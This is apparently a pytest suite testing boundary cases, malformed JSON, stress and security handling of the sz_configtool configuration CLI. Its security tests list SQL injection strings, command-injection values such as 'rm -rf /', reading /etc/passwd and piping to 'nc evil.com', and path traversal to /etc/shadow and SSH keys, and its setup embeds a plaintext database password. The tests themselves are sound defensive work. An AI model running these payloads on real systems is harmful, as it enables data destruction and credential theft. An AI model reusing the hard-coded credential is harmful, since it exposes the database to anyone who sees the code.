"""Edge case and boundary testing for the original sz_configtool.

This test suite focuses on edge cases, boundary conditions, error handling,
and advanced scenarios that might break the original sz_configtool.
"""

import pytest
import subprocess
import tempfile
import os
import json
import time
import random
import string
from typing import List, Dict, Any, Optional, Tuple


class EdgeCaseTester:
    """Test harness for edge case testing of sz_configtool."""

    def __init__(self):
        """Initialize the edge case test harness."""
        self.configtool_path = "/home/bmacy/open_dev/sz-python-tools/sz_tools/sz_configtool"
        self.timeout = 45  # Longer timeout for edge cases
        self.setup_environment()

    def setup_environment(self):
        """Set up the environment for testing."""
        self.env = os.environ.copy()
        self.env['SENZING_ENGINE_CONFIGURATION_JSON'] = '''{
            "PIPELINE": {
                "CONFIGPATH": "/etc/opt/senzing",
                "RESOURCEPATH": "/opt/senzing/er/resources",
                "SUPPORTPATH": "/opt/senzing/data"
            },
            "SQL": {
                "XXXDEBUGLEVEL": 2,
                "CONNECTION": "postgresql://senzing:senzing4pgsql@192.168.2.122:5432:g2"
            }
        }'''

    def run_command(self, command: str, expect_success: bool = True, timeout: int = None) -> Tuple[str, str, int]:
        """Run a command with enhanced error handling."""
        actual_timeout = timeout or self.timeout

        try:
            process = subprocess.run(
                [self.configtool_path],
                input=f"{command}\\nquit\\n",
                text=True,
                capture_output=True,
                env=self.env,
                timeout=actual_timeout
            )

            stdout = process.stdout
            stderr = process.stderr
            returncode = process.returncode

            # Clean output
            import re
            lines = stdout.split('\\n')
            filtered_lines = []
            for line in lines:
                if 'Type help' not in line and 'szcfg' not in line and line.strip():
                    line = re.sub(r'\\x1b\\[[0-9;]*m', '', line)
                    filtered_lines.append(line)

            clean_output = '\\n'.join(filtered_lines)
            return clean_output, stderr, returncode

        except subprocess.TimeoutExpired:
            if expect_success:
                raise Exception(f"Command timed out: {command}")
            return "", f"Timeout after {actual_timeout}s", -1

    def generate_random_string(self, length: int = 10) -> str:
        """Generate a random string for testing."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_long_string(self, length: int = 1000) -> str:
        """Generate a very long string for boundary testing."""
        return 'A' * length


class TestBoundaryConditions:
    """Test boundary conditions and limits."""

    @pytest.fixture(scope="class")
    def tester(self):
        """Create edge case test harness."""
        return EdgeCaseTester()

    def test_extremely_long_command_lines(self, tester):
        """Test handling of extremely long command lines."""
        # Test with very long data source name
        long_name = tester.generate_long_string(500)
        command = f'addDataSource {{"dataSource": "{long_name}"}}'

        output, stderr, returncode = tester.run_command(command, expect_success=False)
        # Should either succeed or fail gracefully
        assert returncode != 0 or "successfully" in output.lower()

    def test_maximum_json_payload_size(self, tester):
        """Test handling of very large JSON payloads."""
        # Create a feature with extremely long description
        large_payload = {
            "feature": "TEST_LARGE_FEATURE",
            "class": "OTHER",
            "behavior": "FM",
            "anonymize": "No",
            "candidates": "No",
            "standardize": "",
            "expression": "",
            "comparison": "",
            "matchKey": "No",
            "description": tester.generate_long_string(2000)
        }

        command = f'addFeature {json.dumps(large_payload)}'
        output, stderr, returncode = tester.run_command(command, expect_success=False, timeout=60)

        # Should handle large payloads gracefully
        assert returncode != 0 or "error" in output.lower() or "successfully" in output.lower()

    def test_unicode_and_special_characters(self, tester):
        """Test handling of Unicode and special characters."""
        special_chars_tests = [
            "TEST_ÜNï©ødé",  # Unicode characters
            "TEST_<>&'quotes'",  # XML/HTML special chars
            "TEST_{{}}[]()+=*&^%$#@!",  # Special symbols
            "TEST_\\t\\n\\r",  # Control characters (escaped)
            "TEST_émojî_🎯🔍",  # Emoji characters
        ]

        for special_name in special_chars_tests:
            try:
                command = f'addDataSource {{"dataSource": "{special_name}"}}'
                output, stderr, returncode = tester.run_command(command, expect_success=False)

                # Should either succeed or provide clear error message
                assert (returncode == 0 or
                       "error" in output.lower() or
                       "invalid" in output.lower() or
                       "character" in output.lower())

            except Exception as e:
                # Unicode handling issues are acceptable for this test
                assert "unicode" in str(e).lower() or "encoding" in str(e).lower()

    def test_null_and_empty_values(self, tester):
        """Test handling of null and empty values."""
        null_tests = [
            '{"dataSource": ""}',  # Empty string
            '{"dataSource": null}',  # Null value
            '{"dataSource": "   "}',  # Whitespace only
            '{}',  # Empty object
        ]

        for null_test in null_tests:
            command = f'addDataSource {null_test}'
            output, stderr, returncode = tester.run_command(command, expect_success=False)

            # Should reject null/empty values appropriately
            assert (returncode != 0 or
                   "error" in output.lower() or
                   "required" in output.lower() or
                   "invalid" in output.lower())

    def test_numeric_boundary_values(self, tester):
        """Test numeric boundary values."""
        # Test with extreme numeric values for thresholds
        boundary_tests = [
            {"candidateCap": 0},
            {"candidateCap": -1},
            {"candidateCap": 999999999},
            {"scoringCap": 0},
            {"scoringCap": -999999},
            {"scoringCap": 999999999},
        ]

        base_threshold = {
            "behavior": "TEST_BEHAVIOR",
            "feature": "ALL",
            "candidateCap": 10,
            "scoringCap": 10,
            "sendToRedo": "No"
        }

        for boundary_test in boundary_tests:
            test_threshold = base_threshold.copy()
            test_threshold.update(boundary_test)

            command = f'addGenericThreshold {json.dumps(test_threshold)}'
            output, stderr, returncode = tester.run_command(command, expect_success=False)

            # Should handle boundary values appropriately
            # Some may be valid, others should be rejected
            assert returncode is not None  # Just ensure it completes


class TestErrorHandling:
    """Test error handling and recovery scenarios."""

    @pytest.fixture(scope="class")
    def tester(self):
        """Create edge case test harness."""
        return EdgeCaseTester()

    def test_malformed_json_variations(self, tester):
        """Test various types of malformed JSON."""
        malformed_json_tests = [
            '{"unclosed": "string}',  # Missing quote
            '{unclosed: "object"',  # Missing brace
            '{"trailing": "comma",}',  # Trailing comma
            '{"duplicate": 1, "duplicate": 2}',  # Duplicate keys
            '{broken json syntax}',  # Invalid syntax
            '{"nested": {"deep": {"very": {"deep": invalid}}}}',  # Deep nesting with error
            'not json at all',  # Not JSON
            '',  # Empty string
            '{"unicode": "\\uXXXX"}',  # Invalid unicode escape
        ]

        for malformed_json in malformed_json_tests:
            command = f'addDataSource {malformed_json}'
            output, stderr, returncode = tester.run_command(command, expect_success=False)

            # Should handle malformed JSON gracefully
            assert (returncode != 0 or
                   "error" in output.lower() or
                   "invalid" in output.lower() or
                   "json" in output.lower())

    def test_missing_required_fields(self, tester):
        """Test handling of missing required fields."""
        incomplete_configs = [
            '{"feature": "TEST"}',  # Missing required fields for feature
            '{"attribute": "TEST"}',  # Missing required fields for attribute
            '{"element": "TEST"}',  # Missing datatype for element
            '{"rule": "TEST"}',  # Missing required fields for rule
        ]

        commands = [
            ('addFeature', incomplete_configs[0]),
            ('addAttribute', incomplete_configs[1]),
            ('addElement', incomplete_configs[2]),
            ('addRule', incomplete_configs[3]),
        ]

        for cmd, config in commands:
            command = f'{cmd} {config}'
            output, stderr, returncode = tester.run_command(command, expect_success=False)

            # Should reject incomplete configurations
            assert (returncode != 0 or
                   "error" in output.lower() or
                   "required" in output.lower() or
                   "missing" in output.lower())

    def test_invalid_references(self, tester):
        """Test handling of invalid references to other entities."""
        invalid_reference_tests = [
            ('getFeature', 'NONEXISTENT_FEATURE'),
            ('getAttribute', 'NONEXISTENT_ATTRIBUTE'),
            ('getElement', 'NONEXISTENT_ELEMENT'),
            ('getRule', '999999'),  # Non-existent rule ID
            ('deleteDataSource', 'NONEXISTENT_SOURCE'),
        ]

        for command, invalid_ref in invalid_reference_tests:
            full_command = f'{command} {invalid_ref}'
            output, stderr, returncode = tester.run_command(full_command, expect_success=False)

            # Should handle invalid references gracefully
            assert (returncode != 0 or
                   "not found" in output.lower() or
                   "does not exist" in output.lower() or
                   "error" in output.lower())

    def test_circular_dependencies(self, tester):
        """Test detection of circular dependencies."""
        # This is more complex and may require specific test data
        # For now, test that the system handles potential circular references

        # Try to create features that might reference each other
        test_name = f"CIRCULAR_TEST_{int(time.time())}"

        try:
            # Create feature A
            feature_a = {
                "feature": f"{test_name}_A",
                "class": "OTHER",
                "behavior": "FM",
                "anonymize": "No",
                "candidates": "No"
            }

            command_a = f'addFeature {json.dumps(feature_a)}'
            output_a, _, _ = tester.run_command(command_a, expect_success=False)

            # The system should handle this appropriately
            assert output_a is not None

        finally:
            # Cleanup
            try:
                tester.run_command(f'deleteFeature {test_name}_A', expect_success=False)
            except:
                pass

    def test_concurrent_modification_simulation(self, tester):
        """Test simulation of concurrent modifications."""
        test_source = f"CONCURRENT_TEST_{int(time.time())}"

        try:
            # Add data source
            add_command = f'addDataSource {{"dataSource": "{test_source}"}}'
            output1, _, _ = tester.run_command(add_command, expect_success=False)

            # Try to add the same data source again (should fail)
            output2, _, returncode2 = tester.run_command(add_command, expect_success=False)

            # Should detect duplicate
            assert (returncode2 != 0 or
                   "exists" in output2.lower() or
                   "duplicate" in output2.lower() or
                   "error" in output2.lower())

        finally:
            # Cleanup
            try:
                tester.run_command(f'deleteDataSource {test_source}', expect_success=False)
            except:
                pass


class TestPerformanceStress:
    """Performance and stress testing scenarios."""

    @pytest.fixture(scope="class")
    def tester(self):
        """Create edge case test harness."""
        return EdgeCaseTester()

    def test_rapid_command_execution(self, tester):
        """Test rapid execution of many commands."""
        # Generate many list commands rapidly
        commands = ["listFeatures", "listAttributes", "listElements", "listRules"] * 5

        start_time = time.time()

        for command in commands:
            output, stderr, returncode = tester.run_command(command, timeout=10)
            assert returncode == 0, f"Command {command} failed during rapid execution"

        elapsed = time.time() - start_time

        # Should complete all commands in reasonable time
        assert elapsed < 120, f"Rapid command execution took too long: {elapsed}s"

    def test_memory_intensive_operations(self, tester):
        """Test memory-intensive operations."""
        # Test operations that might consume significant memory
        memory_intensive_commands = [
            "listFeatures json",  # Large JSON output
            "exportToFile /tmp/test_export.json",  # Full export
            "listAttributes",  # Potentially large attribute list
        ]

        for command in memory_intensive_commands:
            try:
                output, stderr, returncode = tester.run_command(command, timeout=60)
                # Should complete without memory errors
                assert "memory" not in stderr.lower()
                assert "out of" not in stderr.lower()
            except Exception as e:
                # Memory issues might cause timeouts
                assert "timeout" in str(e).lower() or "memory" in str(e).lower()

    def test_deep_nesting_json(self, tester):
        """Test handling of deeply nested JSON structures."""
        # Create a deeply nested JSON structure
        nested_json = {"level1": {"level2": {"level3": {"level4": {"level5": {
            "dataSource": "DEEP_NESTED_TEST"
        }}}}}}

        command = f'addDataSource {json.dumps(nested_json)}'
        output, stderr, returncode = tester.run_command(command, expect_success=False)

        # Should handle deep nesting appropriately
        assert (returncode != 0 or
               "error" in output.lower() or
               "invalid" in output.lower() or
               "format" in output.lower())


class TestSecurityAndValidation:
    """Security and validation testing."""

    @pytest.fixture(scope="class")
    def tester(self):
        """Create edge case test harness."""
        return EdgeCaseTester()

    def test_sql_injection_attempts(self, tester):
        """Test potential SQL injection attempts."""
        sql_injection_tests = [
            "'; DROP TABLE CFG_FTYPE; --",
            "' OR 1=1 --",
            "'; UPDATE CFG_ATTR SET ATTR_CODE='HACKED'; --",
            "' UNION SELECT * FROM CFG_FTYPE --",
            "\\'; EXEC sp_help; --"
        ]

        for injection_attempt in sql_injection_tests:
            # Try injection in various command contexts
            commands = [
                f'getFeature {injection_attempt}',
                f'getAttribute {injection_attempt}',
                f'deleteDataSource {injection_attempt}',
                f'addDataSource {{"dataSource": "{injection_attempt}"}}'
            ]

            for command in commands:
                output, stderr, returncode = tester.run_command(command, expect_success=False)

                # Should not execute SQL injection
                assert "DROP" not in output.upper()
                assert "UPDATE" not in output.upper()
                assert "EXEC" not in output.upper()
                # Should either fail or sanitize input
                assert (returncode != 0 or
                       "error" in output.lower() or
                       "invalid" in output.lower())

    def test_command_injection_attempts(self, tester):
        """Test potential command injection attempts."""
        command_injection_tests = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc evil.com 1234",
            "`whoami`",
            "$(id)",
            "${IFS}cat${IFS}/etc/passwd"
        ]

        for injection_attempt in command_injection_tests:
            command = f'addDataSource {{"dataSource": "{injection_attempt}"}}'
            output, stderr, returncode = tester.run_command(command, expect_success=False)

            # Should not execute command injection
            assert "root:" not in output  # Unix passwd file content
            assert "uid=" not in output   # id command output
            # Should handle malicious input safely
            assert output is not None

    def test_path_traversal_attempts(self, tester):
        """Test path traversal attempts."""
        path_traversal_tests = [
            "../../../etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "../../../../proc/version"
        ]

        for traversal_attempt in path_traversal_tests:
            # Test in file-related commands
            commands = [
                f'exportToFile {traversal_attempt}',
                f'importFromFile {traversal_attempt}',
            ]

            for command in commands:
                output, stderr, returncode = tester.run_command(command, expect_success=False, timeout=10)

                # Should not allow path traversal
                assert "root:" not in output
                assert "ssh-rsa" not in output
                # Should either fail or sanitize path
                assert (returncode != 0 or
                       "error" in output.lower() or
                       "permission" in output.lower() or
                       "not found" in output.lower())


class TestConfigurationConsistency:
    """Test configuration consistency and integrity."""

    @pytest.fixture(scope="class")
    def tester(self):
        """Create edge case test harness."""
        return EdgeCaseTester()

    def test_configuration_state_consistency(self, tester):
        """Test that configuration state remains consistent."""
        # Get initial state
        initial_features, _, _ = tester.run_command("listFeatures")
        initial_attributes, _, _ = tester.run_command("listAttributes")

        # Perform some operations
        test_name = f"CONSISTENCY_TEST_{int(time.time())}"

        try:
            # Add and remove a data source
            add_cmd = f'addDataSource {{"dataSource": "{test_name}"}}'
            tester.run_command(add_cmd, expect_success=False)

            delete_cmd = f'deleteDataSource {test_name}'
            tester.run_command(delete_cmd, expect_success=False)

            # Check that state is consistent
            final_features, _, _ = tester.run_command("listFeatures")
            final_attributes, _, _ = tester.run_command("listAttributes")

            # Core configuration should be unchanged
            # (Note: This is a simplified check)
            assert len(final_features.split('\\n')) >= len(initial_features.split('\\n')) - 5
            assert len(final_attributes.split('\\n')) >= len(initial_attributes.split('\\n')) - 5

        finally:
            # Cleanup
            try:
                tester.run_command(f'deleteDataSource {test_name}', expect_success=False)
            except:
                pass

    def test_referential_integrity(self, tester):
        """Test referential integrity constraints."""
        # Test that deleting referenced entities is handled properly

        # Try to delete a feature that might be referenced by attributes
        # (This should either fail or handle cascading properly)
        features_output, _, _ = tester.run_command("listFeatures")

        if "NAME" in features_output:
            # Try to delete the NAME feature (likely to be referenced)
            delete_output, _, returncode = tester.run_command("deleteFeature NAME", expect_success=False)

            # Should either prevent deletion or handle cascading
            assert (returncode != 0 or
                   "referenced" in delete_output.lower() or
                   "constraint" in delete_output.lower() or
                   "successfully" in delete_output.lower())


if __name__ == "__main__":
    # Run the edge case test suite
    pytest.main([__file__, "-v", "--tb=short", "-x"])